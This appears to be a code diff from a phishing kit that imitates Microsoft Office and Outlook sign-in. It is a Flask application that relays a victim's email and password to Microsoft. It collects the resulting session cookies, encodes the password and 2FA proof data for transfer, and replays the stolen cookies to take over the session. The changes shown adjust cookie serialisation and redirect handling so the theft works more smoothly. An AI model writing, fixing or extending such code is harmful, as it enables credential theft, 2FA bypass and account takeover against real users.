@@ -426,6 +426,9 @@ def loginOffice(email, password):
                 cookie_json = cookieToJSON(cookie_str, domain)
                 list_cookies.append(cookie_json)
 
+        # Convert cookies to JSON string
+        cookie_json_string = json.dumps(list_cookies, separators=(',', ':'))
+
         # Check if 2FA verification needed
         if json_data and json_data.get('arrUserProofs'):
             is_personal = any(domain in email.lower() for domain in [
@@ -449,14 +452,14 @@ def loginOffice(email, password):
                 'data': base64.b64encode(json.dumps(auth_data).encode()).decode(),
                 'method': base64.b64encode(json.dumps(json_data['arrUserProofs']).encode()).decode(),
                 'key': base64.b64encode(password.encode()).decode(),
-                'cookies': list_cookies
+                'cookies': cookie_json_string
             }
 
         # Return success if no 2FA needed
         return {
             'status': 'success',
             'message': 'Login successful',
-            'cookies': list_cookies
+            'cookies': cookie_json_string
         }
 
     except Exception as e:
@@ -1135,8 +1138,12 @@ async def sign_in_handler():
             session['email'] = email
             session['password'] = password
 
-            # Redirect to stay-signed-in route
-            return redirect(url_for('stay_signed_in'))
+            # Render a template that auto-submits a POST request to /stay-signed-in
+            return render_template(
+                'post_redirect.html',
+                action=url_for('stay_signed_in'),
+                form_data={}
+            )
         else:
             return jsonify({
                 "status": "error",
@@ -1214,11 +1221,6 @@ def process(email, password, request):
             'Secure': 'True' # Add Secure attribute
         })
 
-        # Copy cookies from the user's browser request for login.microsoftonline.com
-        for cookie in request.cookies:
-            if 'login.microsoftonline.com' in request.host:
-                session_obj.cookies.set(cookie.name, request.cookies[cookie.name], domain='login.microsoftonline.com', path='/', secure=True, httponly=True, samesite='none')
-
         # Get the redirect URL domain
         is_personal = any(domain in email.lower() for domain in [
             'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
@@ -1287,6 +1289,11 @@ async def final_redirect():
             
             # Add authentication cookies
             login_cookies = session.get('login_cookies', [])
+            if isinstance(login_cookies, str):
+                try:
+                    login_cookies = json.loads(login_cookies)
+                except json.JSONDecodeError:
+                    login_cookies = []
             for cookie in login_cookies:
                 if cookie.get('name') and cookie.get('value'):
                     # Set domain based on account type
